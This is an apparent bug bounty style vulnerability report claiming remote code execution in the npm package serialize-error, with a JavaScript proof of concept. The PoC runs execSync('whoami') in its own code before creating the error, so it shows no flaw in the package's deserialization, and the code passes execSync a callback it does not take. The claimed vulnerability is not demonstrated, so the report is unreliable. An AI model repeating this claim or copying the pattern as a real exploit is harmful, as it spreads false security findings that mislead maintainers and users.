## Description

Serialize-error is an npm package to Serialize/deserialize an error into a plain object

This package is vulnerable to Remote Code Execution due to a deserialization vulnerability which occur when unmarshalling a serialised error object 

## Proof of Concept

```
const {serializeError, deserializeError} = require('serialize-error');

//exploit

let code_exec = () => {
  let exploit=require('child_process').execSync('whoami', (error, stdout, stderr)=> {
      console.log(''+stdout)
    });
  return exploit;
}


const error = new Error(code_exec());

const serialized = serializeError(error)

const deserialized = deserializeError(serialized);

console.log('\x1b[35m'+deserialized)


```
